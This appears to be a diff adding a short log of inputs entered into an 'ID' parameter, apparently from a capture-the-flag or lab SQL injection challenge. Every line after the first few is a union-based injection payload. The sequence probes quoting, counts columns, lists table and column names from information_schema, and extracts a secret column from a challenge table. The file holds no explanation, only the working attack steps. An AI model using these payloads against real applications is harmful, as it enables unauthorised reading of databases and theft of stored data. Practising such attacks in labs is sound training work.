@@ -1,0 +1,9 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:1
+ID:1"
+ID:1"-- 
+ID:-1" union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()-- 
+ID:-1" union select 1, database(),group_concat(column_name) from information_schema.columns where table_name="2a4sfvv8jb" -- 
+ID:-1" union select 1,2,group_concat(secret_I8LF) from challenges.2a4sfvv8jb  -- 
